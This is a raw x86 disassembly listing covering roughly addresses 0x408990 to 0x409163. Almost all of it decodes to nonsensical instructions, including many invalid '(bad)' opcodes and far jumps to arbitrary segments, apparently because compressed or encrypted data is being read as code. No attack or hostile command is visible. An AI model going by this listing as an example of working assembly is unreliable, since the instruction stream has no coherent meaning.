  408990:	pop    ebx
  408991:	sbb    ecx,edx
  408993:	sub    edx,DWORD PTR [eax]
  408995:	ficomp DWORD PTR [ecx+edi*2-0x31]
  408999:	jbe    0x408932
  40899b:	lods   al,BYTE PTR ds:[esi]
  40899c:	imul   edi,DWORD PTR [edi+0x280f4693],0xdd89037b
  4089a6:	ja     0x408931
  4089a8:	sbb    al,0xde
  4089aa:	fidiv  DWORD PTR [edi]
  4089ac:	adc    eax,0xe0ff91a1
  4089b1:	(bad)
  4089b4:	ins    BYTE PTR es:[edi],dx
  4089b5:	imul   edi,DWORD PTR [edi],0x68d3b8d0
  4089bb:	jmp    0xab3ea5f3
  4089c0:	jo     0x408981
  4089c2:	sahf   
  4089c3:	nop
  4089c4:	mov    dh,ch
  4089c6:	push   ss
  4089c7:	daa    
  4089c8:	loope  0x40895a
  4089ca:	xchg   esp,eax
  4089cb:	xchg   DWORD PTR ds:0xb1e467e0,edi
  4089d1:	add    edx,ecx
  4089d3:	sbb    bh,BYTE PTR [eax]
  4089d5:	es int 0xf8
  4089d8:	xchg   ebp,eax
  4089d9:	or     al,BYTE PTR [ecx-0x4ed0ff86]
  4089df:	das    
  4089e0:	repnz les eax,FWORD PTR [ebp+0x1dbbd758]
  4089e7:	stc    
  4089e8:	pop    edx
  4089e9:	xor    eax,0x39124a6
  4089ee:	xor    esi,ebp
  4089f0:	dec    edi
  4089f1:	out    dx,al
  4089f2:	addr16 mov ds:0x3d30,eax
  4089f6:	push   0xd1a55e16
  4089fb:	jp     0x408a29
  4089fd:	pop    ecx
  4089fe:	out    dx,al
  4089ff:	shl    BYTE PTR [ebx],0xd3
  408a02:	sbb    ecx,DWORD PTR [edx]
  408a04:	out    dx,eax
  408a05:	push   cs
  408a06:	xor    eax,0xe92d24c3
  408a0b:	rol    edi,1
  408a0d:	mov    ebp,0xf660af49
  408a12:	scas   eax,DWORD PTR es:[edi]
  408a13:	repnz sbb BYTE PTR [ebx],cl
  408a16:	xor    ch,dh
  408a18:	mov    ecx,0x3212406c
  408a1d:	xor    al,0x3e
  408a1f:	and    ecx,DWORD PTR [eax+esi*4]
  408a22:	jg     0x4089e2
  408a24:	cmp    BYTE PTR [edx-0x54],cl
  408a27:	adc    BYTE PTR [edi-0x448c08ff],ch
  408a2d:	popa   
  408a2e:	loope  0x4089e9
  408a30:	jmp    0x408a24
  408a32:	fld    st(7)
  408a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a35:	fidivr DWORD PTR [edx-0x47cd9dec]
  408a3b:	jo     0x408a7e
  408a3d:	xchg   ebx,eax
  408a3e:	pop    ds
  408a3f:	lahf   
  408a40:	and    DWORD PTR [esi-0x8687bc6],ecx
  408a46:	push   0xf16b6170
  408a4b:	fwait
  408a4c:	push   eax
  408a4d:	stos   BYTE PTR es:[edi],al
  408a4e:	cmp    esi,DWORD PTR [esi+0x12]
  408a51:	mov    ds:0xc387767e,al
  408a56:	cmp    ebx,DWORD PTR [esi-0x7e]
  408a59:	cld    
  408a5a:	mov    ah,0x80
  408a5c:	les    eax,FWORD PTR [edi-0x4e]
  408a5f:	loope  0x408abe
  408a61:	and    BYTE PTR [eax-0x1b8c0202],bl
  408a67:	scas   al,BYTE PTR es:[edi]
  408a68:	mov    al,0xc8
  408a6a:	mov    al,ds:0xb7879e84
  408a6f:	xchg   ebx,eax
  408a70:	add    eax,0xd24e035
  408a75:	pop    ds
  408a76:	push   esp
  408a77:	mov    dl,0x1e
  408a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a7a:	das    
  408a7b:	inc    edx
  408a7c:	xor    al,0x5d
  408a7e:	cmc    
  408a7f:	adc    ch,bh
  408a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a82:	aam    0x14
  408a84:	out    0x95,al
  408a86:	inc    esp
  408a87:	pop    edx
  408a88:	lods   al,BYTE PTR ds:[esi]
  408a89:	aam    0x41
  408a8b:	pop    ss
  408a8c:	pusha  
  408a8d:	into   
  408a8e:	(bad)  
  408a8f:	test   eax,0x54acaf51
  408a94:	aas    
  408a95:	or     DWORD PTR [edi+0xe6fb151],0xe9dc3efe
  408a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aa0:	xor    eax,0xf3b69b2c
  408aa5:	mov    ecx,0x7a29c9e8
  408aaa:	sbb    eax,0x641c8776
  408aaf:	scas   eax,DWORD PTR es:[edi]
  408ab0:	xchg   ebx,eax
  408ab1:	nop
  408ab2:	div    dl
  408ab4:	call   0x22c8dce
  408ab9:	mov    ecx,0x5104fd5d
  408abe:	add    dl,BYTE PTR [ebp-0x14215f87]
  408ac4:	icebp  
  408ac5:	push   edx
  408ac6:	jns    0x408a7e
  408ac8:	jb     0x408ace
  408aca:	xchg   DWORD PTR [edx+0x6aff3988],esi
  408ad0:	retf   0x6ffa
  408ad3:	xchg   esi,eax
  408ad4:	outs   dx,BYTE PTR ds:[esi]
  408ad5:	or     eax,0x385a1f22
  408ada:	push   ebp
  408adb:	cmp    eax,0x2b8899f9
  408ae0:	sub    edi,DWORD PTR [ebp-0x51]
  408ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ae4:	loop   0x408ac4
  408ae6:	lds    ecx,FWORD PTR [ecx+0x12]
  408ae9:	dec    esi
  408aea:	push   es
  408aeb:	dec    ecx
  408aec:	ins    DWORD PTR es:[edi],dx
  408aed:	fs pop eax
  408aef:	cmp    eax,0xc3b9c263
  408af4:	xchg   esi,eax
  408af5:	sbb    al,0x43
  408af7:	movlps xmm4,QWORD PTR [ecx]
  408afa:	dec    esp
  408afb:	dec    eax
  408afc:	inc    ebp
  408afd:	neg    bh
  408aff:	jae    0x408ab9
  408b01:	dec    ecx
  408b02:	in     al,0x9b
  408b04:	cmp    eax,0x31a3fbc1
  408b09:	adc    BYTE PTR [eax+esi*4],al
  408b0c:	mov    dl,0xe4
  408b0e:	dec    esi
  408b0f:	and    al,0x74
  408b11:	ss leave 
  408b13:	fstp   DWORD PTR [esi-0x7]
  408b16:	gs mov dh,0xcd
  408b19:	inc    eax
  408b1a:	or     eax,0xd2cb6930
  408b1f:	aas    
  408b20:	xchg   ebx,eax
  408b21:	not    BYTE PTR [ecx]
  408b23:	mov    ch,0x2a
  408b25:	nop
  408b26:	jmp    0x408ab8
  408b28:	cmp    ch,bh
  408b2a:	inc    esi
  408b2b:	pop    eax
  408b2c:	in     eax,0xb4
  408b2e:	xchg   esi,eax
  408b2f:	je     0x408aeb
  408b31:	ins    DWORD PTR es:[edi],dx
  408b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b33:	dec    ebp
  408b34:	push   cs
  408b35:	call   0x64f1:0x285622bf
  408b3c:	xor    eax,0x2fdd68db
  408b41:	out    dx,al
  408b42:	xchg   edi,eax
  408b43:	fcmovnbe st,st(0)
  408b45:	mov    esp,0x24be041b
  408b4a:	mov    bh,0x65
  408b4c:	or     eax,0x7fb2412a
  408b51:	test   DWORD PTR [ecx+0x4a9f4591],edx
  408b57:	push   ss
  408b58:	xor    DWORD PTR [edi+0x1b],ebx
  408b5b:	ja     0x408b47
  408b5d:	adc    eax,0xb0abd6d
  408b62:	fild   WORD PTR [esi+0x2f2e1237]
  408b68:	out    0x46,eax
  408b6a:	pop    eax
  408b6b:	sub    eax,0xa37c7c3b
  408b70:	and    BYTE PTR [eax+0x7e621b0d],ch
  408b76:	pop    edi
  408b77:	inc    ecx
  408b78:	repz xchg ecx,eax
  408b7a:	mov    eax,0x4b00b6c7
  408b7f:	lahf   
  408b80:	dec    edx
  408b81:	inc    eax
  408b82:	lods   al,BYTE PTR ds:[esi]
  408b83:	sbb    eax,0x7c2740bb
  408b88:	scas   al,BYTE PTR es:[edi]
  408b89:	fisubr WORD PTR [edi+0x1bce496b]
  408b8f:	in     eax,0xe5
  408b91:	cmp    al,BYTE PTR [edx+0x5d]
  408b94:	push   0x23
  408b96:	pop    eax
  408b97:	je     0x408bc3
  408b99:	mov    al,0xf0
  408b9b:	dec    ebp
  408b9c:	dec    eax
  408b9d:	rcr    BYTE PTR [ebp+0x6ad45fd4],1
  408ba3:	retf   
  408ba4:	cmp    BYTE PTR [edx-0x45],ah
  408ba7:	mov    eax,0x70da6d2c
  408bac:	xlat   BYTE PTR ds:[ebx]
  408bad:	add    esp,eax
  408baf:	in     al,dx
  408bb0:	enter  0xc5ad,0xd9
  408bb4:	push   edi
  408bb5:	push   esi
  408bb6:	fnstsw ax
  408bb8:	xor    eax,0x430e1a7d
  408bbd:	mov    edi,0x7f61b8b8
  408bc2:	jae    0x408c19
  408bc4:	imul   edx,eax,0xfffffff7
  408bc7:	rcr    DWORD PTR [edi],0x89
  408bca:	out    0xd6,al
  408bcc:	das    
  408bcd:	lea    esi,[ebx-0x4b]
  408bd0:	pmaxub mm6,QWORD PTR [edi]
  408bd3:	(bad)  
  408bd5:	fucom  st(6)
  408bd7:	cmp    BYTE PTR [edi+eax*8+0x5e710463],al
  408bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bdf:	shl    DWORD PTR [bp+si+0x77],0x7b
  408be4:	pop    ebp
  408be5:	loop   0x408b8b
  408be7:	test   BYTE PTR [ebp+0x55],cl
  408bea:	icebp  
  408beb:	xor    ch,BYTE PTR [edx+0x54c66c55]
  408bf1:	mov    dh,0x45
  408bf3:	push   edi
  408bf4:	mov    ecx,0x7dbe45eb
  408bf9:	mov    WORD PTR [ecx-0x1780eebb],ds
  408bff:	icebp  
  408c00:	push   edx
  408c01:	mov    ds:0x6c7b7216,al
  408c06:	fimul  WORD PTR [edx+0x59032644]
  408c0c:	shr    BYTE PTR ds:0xfc09610e,cl
  408c12:	push   edx
  408c13:	mov    al,0xff
  408c15:	dec    edx
  408c16:	mov    cl,ah
  408c18:	ja     0x408be0
  408c1a:	nop
  408c1b:	xchg   edx,eax
  408c1c:	call   0x71e2fc83
  408c21:	icebp  
  408c22:	xchg   edx,eax
  408c23:	js     0x408bd2
  408c25:	xchg   ebp,eax
  408c26:	push   0xffffffc4
  408c28:	pop    ebx
  408c29:	pushf  
  408c2a:	add    DWORD PTR [eax+edx*8+0x6b9e10ab],edx
  408c31:	dec    esi
  408c32:	rcr    BYTE PTR [ebx-0x5a],cl
  408c35:	add    DWORD PTR [edi+0x4e],ebp
  408c38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c39:	repz test DWORD PTR [ecx],edi
  408c3c:	int    0x4e
  408c3e:	sbb    eax,0x3e5316a9
  408c43:	mov    BYTE PTR [esi+0x49592b69],cl
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  edx,QWORD PTR [ecx]
  408c71:	ja     0x408c7f
  408c73:	mov    cl,0x47
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c64
  408c7d:	xor    DWORD PTR [esi+0x652ed3f8],edi
  408c83:	or     bh,BYTE PTR [edx+0x3f]
  408c86:	sbb    eax,0x26647266
  408c8b:	lds    ebx,FWORD PTR [ecx]
  408c8d:	inc    edi
  408c8e:	(bad)  
  408c8f:	rcr    DWORD PTR [ebx+0x2ccd934d],1
  408c95:	xchg   ecx,eax
  408c96:	leave  
  408c97:	adc    eax,0xa6efe861
  408c9c:	(bad)  
  408c9d:	shl    BYTE PTR [ecx-0x3f2ca20c],1
  408ca3:	repnz dec ebx
  408ca5:	xchg   BYTE PTR [edi-0x3e],dh
  408ca8:	dec    edx
  408ca9:	in     eax,0x2e
  408cab:	imul   edx,DWORD PTR [ecx+0x40],0x41d391f1
  408cb2:	loope  0x408c3a
  408cb4:	sbb    ebx,DWORD PTR [eax]
  408cb6:	xchg   DWORD PTR ds:[eax+0x2],eax
  408cba:	jmp    0xa02c:0x6026aa7e
  408cc1:	push   0xfffffffc
  408cc3:	aaa    
  408cc4:	mov    bl,0xf0
  408cc6:	lock mov edx,0xf82387b3
  408ccc:	jne    0x408cb0
  408cce:	pop    ebx
  408ccf:	pop    edx
  408cd0:	and    eax,0x17b45a06
  408cd5:	stos   BYTE PTR es:[edi],al
  408cd6:	cmc    
  408cd7:	xchg   DWORD PTR [edx+0x4a823c53],esp
  408cdd:	lods   eax,DWORD PTR ds:[esi]
  408cde:	or     al,BYTE PTR [edi]
  408ce0:	inc    ebp
  408ce1:	and    BYTE PTR [esp+edi*4-0x14841a78],0x7d
  408ce9:	repnz adc bh,BYTE PTR [ecx+0x9]
  408ced:	lods   al,BYTE PTR ds:[esi]
  408cee:	pop    ss
  408cef:	ja     0x408d5a
  408cf1:	xchg   DWORD PTR [esi+ebx*8],eax
  408cf4:	mov    edx,DWORD PTR [edi-0x4661b237]
  408cfa:	ins    DWORD PTR es:[edi],dx
  408cfb:	pop    ebp
  408cfc:	jae    0x408d38
  408cfe:	jno    0x408cc1
  408d00:	cmc    
  408d01:	jmp    0x4b6e:0x2df34bd5
  408d08:	or     al,dh
  408d0a:	(bad)
  408d0f:	and    eax,0xb3160108
  408d15:	pop    ebp
  408d16:	int3   
  408d17:	mov    cl,0xe1
  408d19:	dec    esp
  408d1a:	ds fsubrp st(6),st
  408d1d:	sbb    esi,eax
  408d1f:	ffreep st(0)
  408d21:	fwait
  408d22:	mov    al,0xea
  408d24:	addr16 xor al,0x3c
  408d27:	xor    eax,edi
  408d29:	mov    bh,0x2d
  408d2b:	imul   ebp,DWORD PTR [esi],0xffffffc9
  408d2e:	jle    0x408d9d
  408d30:	gs mov edi,0x15e97f6
  408d36:	pop    ecx
  408d37:	pop    ss
  408d38:	mov    cl,0x36
  408d3a:	loope  0x408db9
  408d3c:	sub    eax,0xcb566cfa
  408d41:	dec    esi
  408d42:	(bad)  
  408d43:	or     al,0xcf
  408d45:	jecxz  0x408d9a
  408d47:	jns    0x408d94
  408d49:	jle    0x408cf7
  408d4b:	data16 mov dl,0x23
  408d4e:	imul   DWORD PTR [edx+0x67af5e82]
  408d54:	xchg   BYTE PTR [edx+0x6150f7f2],al
  408d5a:	push   ebx
  408d5b:	jle    0x408db0
  408d5d:	xor    eax,0xab25495f
  408d62:	mov    eax,0x16a6a06b
  408d67:	push   es
  408d68:	(bad)  
  408d69:	fidiv  WORD PTR [eax+0x431ffe39]
  408d6f:	cmp    al,0x49
  408d71:	test   eax,0x7fbddff2
  408d76:	push   esp
  408d77:	(bad)  
  408d78:	sti    
  408d79:	sahf   
  408d7a:	leave  
  408d7b:	pop    edi
  408d7c:	into   
  408d7d:	inc    ecx
  408d7e:	xchg   edx,eax
  408d7f:	jns    0x408d1c
  408d81:	lock adc al,BYTE PTR [ecx]
  408d84:	jns    0x408d10
  408d86:	mov    al,0x23
  408d88:	jge    0x408dd5
  408d8a:	das    
  408d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d8c:	mov    DWORD PTR [edx-0x4b668ce2],0xa977acb5
  408d96:	mov    ebp,0xe7cb876b
  408d9b:	shl    DWORD PTR [ebx],cl
  408d9d:	pop    ecx
  408d9e:	push   ss
  408d9f:	fsub   DWORD PTR [esi+eiz*8-0x2a626d00]
  408da6:	sub    al,0x1f
  408da8:	popf   
  408da9:	call   0xc0f8:0x6ca4cf0f
  408db0:	add    eax,DWORD PTR [eax-0x69]
  408db3:	fidivr DWORD PTR [eax+0x727f199]
  408db9:	jno    0x408e0e
  408dbb:	outs   dx,DWORD PTR ds:[esi]
  408dbc:	push   eax
  408dbd:	(bad)  
  408dbe:	sub    al,0xdb
  408dc0:	inc    ecx
  408dc1:	jmp    0x2476c604
  408dc6:	arpl   WORD PTR [ebp+0x12],bp
  408dc9:	ret    0x1dd6
  408dcc:	inc    esi
  408dcd:	jp     0x408e09
  408dcf:	fmul   QWORD PTR [esi+edx*4]
  408dd2:	(bad)  
  408dd3:	repnz and ecx,DWORD PTR [edx]
  408dd6:	(bad)  
  408dd7:	mov    esi,0x5485dc88
  408ddc:	leave  
  408ddd:	dec    ecx
  408dde:	mov    dl,0x6d
  408de0:	pop    esp
  408de1:	cmp    al,0x5d
  408de3:	mov    BYTE PTR [esi-0x29a49657],al
  408de9:	pop    esi
  408dea:	adc    DWORD PTR ds:0x44f99b85,ebp
  408df0:	and    al,0xd6
  408df2:	js     0x408d8f
  408df4:	sahf   
  408df5:	mov    cl,bh
  408df7:	sub    dh,BYTE PTR [edi-0x15d73721]
  408dfd:	das    
  408dfe:	xchg   esp,eax
  408dff:	cmp    cl,BYTE PTR [edx]
  408e01:	jl     0x408e2e
  408e03:	push   0x6d
  408e05:	cmp    ch,bh
  408e07:	hlt    
  408e08:	cmp    esi,0xffffffb9
  408e0b:	push   0xffffff91
  408e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e0e:	cli    
  408e0f:	push   ecx
  408e10:	sub    al,0x96
  408e12:	push   eax
  408e13:	mov    eax,0xb2c88ccc
  408e18:	hlt    
  408e19:	in     eax,dx
  408e1a:	aaa    
  408e1b:	lods   al,BYTE PTR ds:[esi]
  408e1c:	std    
  408e1d:	pop    ecx
  408e1e:	push   ebp
  408e1f:	ret    
  408e20:	jmp    0x408dcf
  408e22:	es stc 
  408e24:	sar    DWORD PTR [esi+0x3af673a9],0x21
  408e2b:	ja     0x408de6
  408e2d:	jno    0x408e90
  408e2f:	xchg   ebp,eax
  408e30:	fcom   QWORD PTR [esi+0x2b8a38bb]
  408e36:	push   edx
  408e37:	push   esp
  408e38:	gs jmp 0x5f14:0x3070e657
  408e40:	adc    BYTE PTR [ebx],dl
  408e42:	pop    esi
  408e43:	dec    ebp
  408e44:	shl    DWORD PTR [ebp-0x1620f21],0xc1
  408e4b:	and    edx,DWORD PTR [ecx]
  408e4d:	inc    eax
  408e4e:	out    0xaf,al
  408e50:	xor    esp,eax
  408e52:	jmp    0x1cb2cef
  408e57:	inc    ecx
  408e58:	mov    esp,0x67a4bbe7
  408e5d:	inc    ebp
  408e5e:	ret    
  408e5f:	out    dx,al
  408e60:	xlat   BYTE PTR ds:[ebx]
  408e61:	xor    eax,0x420c2f0
  408e66:	sahf   
  408e67:	adc    BYTE PTR [edi+0x5e14dd33],ch
  408e6d:	icebp  
  408e6e:	pop    ebx
  408e6f:	fs dec eax
  408e71:	dec    edx
  408e72:	(bad)  
  408e73:	jmp    0x408e24
  408e75:	clc    
  408e76:	mov    dh,0xb5
  408e78:	dec    ebx
  408e79:	fs inc ebp
  408e7b:	aas    
  408e7c:	mov    ch,BYTE PTR [eax+0x4]
  408e7f:	icebp  
  408e80:	into   
  408e81:	loop   0x408e90
  408e83:	pop    ds
  408e84:	push   ebp
  408e85:	repnz std 
  408e87:	inc    esi
  408e88:	mov    esp,0x4d45ebc5
  408e8d:	jns    0x408f05
  408e8f:	jmp    0xaa310e85
  408e94:	lock xchg esi,eax
  408e96:	and    esp,edi
  408e98:	rcl    BYTE PTR [eax-0x56ce5c77],cl
  408e9e:	shl    DWORD PTR [ebx],1
  408ea0:	mov    ds:0x61d13165,al
  408ea5:	mov    ebp,0x89651c8c
  408eaa:	add    eax,0x19933259
  408eaf:	je     0x408eed
  408eb1:	popf   
  408eb2:	xor    al,0x2f
  408eb4:	retf   0xb77e
  408eb7:	jmp    0x408ed9
  408eb9:	stc    
  408eba:	dec    ebx
  408ebb:	mov    BYTE PTR cs:[ecx-0x49e8cfb2],ah
  408ec2:	outs   dx,BYTE PTR gs:[esi]
  408ec4:	sbb    al,0xd6
  408ec6:	mov    dh,0x52
  408ec8:	jle    0x408f1a
  408eca:	add    eax,0xa9602098
  408ecf:	rcl    BYTE PTR es:[ecx],0xe6
  408ed3:	jmp    0x3110:0x2b11b75d
  408eda:	adc    esi,0x14d2ec7a
  408ee0:	jg     0x408e99
  408ee2:	fld    TBYTE PTR [edi-0x3d]
  408ee5:	retf   
  408ee6:	pop    ds
  408ee7:	in     al,0xb6
  408ee9:	(bad)  
  408eea:	(bad)  
  408eeb:	es push eax
  408eed:	data16 mov bl,0x3b
  408ef0:	mov    ebp,0x8d137b5c
  408ef5:	xchg   esp,eax
  408ef6:	daa    
  408ef7:	(bad)  
  408ef8:	fbld   TBYTE PTR [ecx+0xe5ef424]
  408efe:	int3   
  408eff:	cmc    
  408f00:	pop    esi
  408f01:	in     al,dx
  408f02:	es add al,0xb9
  408f05:	popf   
  408f06:	shl    DWORD PTR [edx-0x28],1
  408f09:	int3   
  408f0a:	inc    eax
  408f0b:	in     al,0x52
  408f0d:	ror    DWORD PTR [ebp-0x11253bec],cl
  408f13:	retf   
  408f14:	(bad)  
  408f15:	pop    eax
  408f16:	call   0xd557:0xfe950c42
  408f1d:	arpl   WORD PTR [ebp-0x63],ax
  408f20:	mov    ah,0xcd
  408f22:	int3   
  408f23:	call   0x1190:0xb724b9b8
  408f2a:	mov    al,BYTE PTR [ebx+0x20ed6fce]
  408f30:	sub    al,0x2e
  408f32:	addr16 xor cl,bh
  408f35:	sahf   
  408f36:	loop   0x408fa2
  408f38:	mov    eax,0x663fdbd7
  408f3d:	repz adc dh,BYTE PTR [eax]
  408f40:	ins    BYTE PTR es:[edi],dx
  408f41:	stc    
  408f42:	pop    ecx
  408f43:	mov    al,ds:0xcfd41698
  408f48:	test   al,0xbf
  408f4a:	fidivr WORD PTR [edi+ebp*1+0x3794c0d6]
  408f51:	iret   
  408f52:	jecxz  0x408fbb
  408f54:	xchg   edx,eax
  408f55:	push   cs
  408f56:	jmp    0x9bf4f99a
  408f5b:	add    dh,BYTE PTR cs:[esi-0x5c4b5605]
  408f62:	xchg   edi,eax
  408f63:	loopne 0x408f8a
  408f65:	(bad)  
  408f66:	cdq    
  408f67:	mov    al,0xfc
  408f69:	mov    dl,BYTE PTR [esi]
  408f6b:	dec    ecx
  408f6c:	mov    ds:0x8c66bea8,al
  408f71:	hlt    
  408f72:	add    BYTE PTR [ecx-0x38],cl
  408f75:	enter  0x14fe,0x5d
  408f79:	outs   dx,DWORD PTR ss:[esi]
  408f7b:	gs jecxz 0x408f2b
  408f7e:	std    
  408f7f:	pop    esi
  408f80:	mov    ebp,0xb5aefd5f
  408f85:	ffree  st(5)
  408f87:	sub    esi,ebp
  408f89:	and    eax,0x98dd5dd5
  408f8e:	sbb    edi,DWORD PTR [edx]
  408f90:	aas    
  408f91:	push   ds
  408f92:	fadd   DWORD PTR [edi+0xc5da279]
  408f98:	sar    DWORD PTR [edx+ebp*1+0x37a45a8d],0x78
  408fa0:	(bad)  
  408fa1:	jno    0x408fef
  408fa3:	sbb    esi,eax
  408fa5:	int    0x1e
  408fa7:	jns    0x408fed
  408fa9:	mov    bh,0x1
  408fab:	xor    edi,edi
  408fad:	xor    BYTE PTR [ebp+0x41b02c05],cl
  408fb3:	add    cl,ch
  408fb5:	dec    eax
  408fb6:	add    eax,DWORD PTR [eax]
  408fb8:	add    BYTE PTR [esp+edi*2],al
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x121937f3
  408fc6:	(bad)  
  408fc8:	cli    
  408fc9:	ja     0x408fb1
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408f94
  408fd2:	mov    edi,0x1fe5b9a8
  408fd7:	addr16 enter 0xa2ce,0xd
  408fdc:	push   cs
  408fdd:	pop    edi
  408fde:	push   esi
  408fdf:	mov    esi,0xa778d389
  408fe4:	out    0x5d,eax
  408fe6:	ins    DWORD PTR es:[edi],dx
  408fe7:	stc    
  408fe8:	lea    edi,[esp+ebp*1+0x4d]
  408fec:	rep lods al,BYTE PTR ds:[esi]
  408fee:	jbe    0x408fc2
  408ff0:	xor    al,0xa9
  408ff2:	push   edi
  408ff3:	jne    0x40905f
  408ff5:	mov    cl,bl
  408ff7:	xchg   esp,eax
  408ff8:	out    0xad,eax
  408ffa:	inc    ecx
  408ffb:	dec    eax
  408ffc:	rol    DWORD PTR fs:[ebp+ebx*4-0x58],cl
  409001:	push   0x73
  409003:	loope  0x409042
  409005:	data16 (bad) 
  409007:	sub    edi,ebp
  409009:	icebp  
  40900a:	cmp    BYTE PTR [ecx],0x8e
  40900d:	and    ch,BYTE PTR [edx]
  40900f:	scas   al,BYTE PTR es:[edi]
  409010:	add    dl,dh
  409012:	mov    esp,0x90e68e3b
  409017:	mov    edx,0x1398cf29
  40901c:	xchg   edx,eax
  40901d:	fcomp  QWORD PTR [edx]
  40901f:	sti    
  409020:	test   al,0x64
  409022:	dec    esp
  409023:	sbb    DWORD PTR [ecx+esi*1+0x63c3e602],edi
  40902a:	scas   al,BYTE PTR es:[edi]
  40902b:	gs pop ss
  40902d:	inc    esp
  40902e:	lods   eax,DWORD PTR ds:[esi]
  40902f:	repz mov cl,0xfb
  409032:	loop   0x408fe8
  409034:	push   ebx
  409035:	pop    ds
  409036:	adc    BYTE PTR [edi-0x18127c29],dl
  40903c:	dec    esp
  40903d:	test   DWORD PTR [ebp+0x8],ecx
  409040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409041:	adc    edi,DWORD PTR [edx]
  409043:	jne    0x409043
  409045:	mov    ds:0x278d87a,al
  40904a:	sbb    DWORD PTR [eax+0x4f],esi
  40904d:	pushf  
  40904e:	and    al,0xaa
  409050:	ficom  DWORD PTR [esi+0xf]
  409053:	stos   BYTE PTR es:[edi],al
  409054:	xchg   ecx,eax
  409055:	push   ecx
  409056:	addr16 push eax
  409058:	icebp  
  409059:	das    
  40905a:	inc    esp
  40905b:	je     0x40908a
  40905d:	pop    ebx
  40905e:	xchg   esi,eax
  40905f:	stos   DWORD PTR es:[edi],eax
  409060:	and    eax,0x71edb9be
  409065:	gs in  al,0xb9
  409068:	stos   DWORD PTR es:[edi],eax
  409069:	push   esi
  40906a:	jbe    0x408ff4
  40906c:	test   BYTE PTR [edx+0x42c878ad],bh
  409072:	xchg   edx,eax
  409073:	adc    al,0x3f
  409075:	ds push esi
  409077:	add    dh,BYTE PTR [ebp+0x31d1cb32]
  40907d:	xlat   BYTE PTR ds:[ebx]
  40907e:	inc    ebp
  40907f:	push   ebx
  409080:	int3   
  409081:	sbb    eax,DWORD PTR [esi]
  409083:	(bad)  
  409084:	push   0xa963f03d
  409089:	mov    ?,WORD PTR [eax]
  40908b:	repnz or ah,bh
  40908e:	inc    ebx
  40908f:	(bad)  
  409090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409091:	pop    ds
  409092:	sti    
  409093:	adc    dh,BYTE PTR [edx+0xd]
  409096:	dec    ecx
  409097:	cmp    cl,BYTE PTR [ecx+0x22ebb00b]
  40909d:	ja     0x40908a
  40909f:	enter  0x497a,0x8b
  4090a3:	in     eax,dx
  4090a4:	xor    ebp,0x782dd84d
  4090aa:	or     eax,DWORD PTR [edi+0x5c]
  4090ad:	shl    ah,0xc6
  4090b0:	jle    0x409050
  4090b2:	call   0xbca9d3e0
  4090b7:	sbb    eax,DWORD PTR [eax+0x65]
  4090ba:	jns    0x40908d
  4090bc:	mov    edx,0x834e2dd
  4090c1:	sub    eax,0xcb745a9c
  4090c6:	push   ebp
  4090c7:	push   esp
  4090c8:	xchg   edi,eax
  4090c9:	loop   0x409106
  4090cb:	call   0x718f:0x85865209
  4090d2:	sub    bh,BYTE PTR [ebx]
  4090d4:	cdq    
  4090d5:	lock int3 
  4090d7:	mov    eax,ds:0x6daa2e5f
  4090dc:	aam    0x14
  4090de:	jno    0x40907d
  4090e0:	pop    edi
  4090e1:	dec    edx
  4090e2:	and    eax,0xde634d4a
  4090e7:	nop
  4090e8:	mov    al,ds:0x8525d369
  4090ed:	aas    
  4090ee:	adc    dl,BYTE PTR [esi]
  4090f0:	repz xor eax,0x581f0596
  4090f6:	arpl   WORD PTR [ecx-0x30],dx
  4090f9:	cli    
  4090fa:	jp     0x4090ce
  4090fc:	popf   
  4090fd:	mov    ah,0xc4
  4090ff:	(bad)  [ebx]
  409101:	mov    ds:0x23118d12,al
  409106:	popa   
  409107:	adc    ecx,DWORD PTR [edi]
  409109:	ficom  DWORD PTR [ebx]
  40910b:	dec    edi
  40910c:	dec    ebp
  40910d:	fiadd  DWORD PTR [edi+0x112e4d21]
  409113:	adc    cl,BYTE PTR [edi]
  409115:	enter  0x99be,0x73
  409119:	(bad)  
  40911a:	and    eax,0xd7ee1509
  40911f:	dec    edx
  409120:	xor    bh,BYTE PTR [edx-0x79b6c820]
  409126:	ins    DWORD PTR es:[edi],dx
  409127:	jae    0x40914d
  409129:	jbe    0x409111
  40912b:	and    DWORD PTR ds:0xdf11f75f,esp
  409131:	cmp    al,0x73
  409133:	mov    esi,0x7678c70
  409138:	fisttp WORD PTR [ecx]
  40913a:	arpl   ax,ax
  40913c:	repnz inc esp
  40913e:	hlt    
  40913f:	xor    ecx,ebx
  409141:	ds dec edx
  409143:	fcomp  QWORD PTR [edx-0x39]
  409146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409147:	jl     0x40915c
  409149:	push   ecx
  40914a:	rcr    BYTE PTR ds:0x9a62725e,cl
  409150:	(bad)  
  409151:	imul   ecx,DWORD PTR [ebx],0xffffffc4
  409154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409155:	hlt    
  409156:	gs (bad) 
  409158:	hlt    
  409159:	inc    esi
  40915a:	add    al,0x74
  40915c:	mov    esi,0x5f6c1237
  409161:	ror    al,1
  409163:	(bad)  
